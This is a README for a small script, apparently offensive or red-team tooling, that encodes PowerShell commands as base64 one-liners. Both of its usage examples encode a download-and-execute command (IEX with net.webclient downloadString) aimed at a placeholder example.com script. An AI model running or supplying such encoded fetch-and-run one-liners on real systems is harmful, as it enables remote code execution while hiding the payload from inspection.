# Powershell Encoder

## Description

Script to make Powershell base64 one-liners. 👨‍💻 👩‍💻

## Download and Execution

### Docker

```
git clone https://github.com/oddrabbit/Powershell-Encoder.git
cd Powershell-Encoder/
chmod +x ./docker-run.sh
./docker-run.sh
./docker-run.sh --command 'IEX(new-object net.webclient).downloadString("http://example.com/script.ps1")'
```

### Manual

```
git clone https://github.com/oddrabbit/Powershell-Encoder.git
cd Powershell-Encoder/
python3 ./powershell_encoder.py
python3 powershell_encoder.py --command 'IEX(new-object net.webclient).downloadString("http://example.com/script.ps1")'
```

## License

GNU General Public License version 2 (GPLv2). See LICENSE file.
